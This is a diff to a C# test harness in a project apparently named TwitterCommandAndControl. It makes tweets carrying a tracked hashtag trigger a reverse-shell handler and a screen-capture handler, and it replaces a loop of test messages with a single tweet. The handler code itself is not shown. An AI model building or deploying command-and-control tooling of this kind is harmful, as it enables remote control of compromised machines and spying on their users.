@@ -17,24 +17,23 @@ namespace TwitterCommandAndControl.Test
 
             var tracker = Tracker.New(x => {
                 Console.WriteLine(x);
+                Task.Run(() =>
+                {
+                    ReverseShellHandler.Respond(x);
+                    ScreenCaptureHandler.Respond(x);
+                });
             }, 
             track: hashTag, 
             log: Console.Out);
             
             while (!tracker.IsActive) ;
+            Console.WriteLine("Tracker Active");
 
-            Console.WriteLine("Starting Test");
-
-            for (var i = 0; i < 10; i++)
-            {
-                Messenger.Send(hashTag + " Test " + i);
-                Thread.Sleep(1000);
-            }
-
-            Console.WriteLine("Test Complete");
+            Messenger.Send(hashTag + " test");
+            
             Console.WriteLine("Press Any Key To Exit");
 
-            Console.ReadLine();
+            Console.ReadKey();
 
             //tracker.Wait();
         }
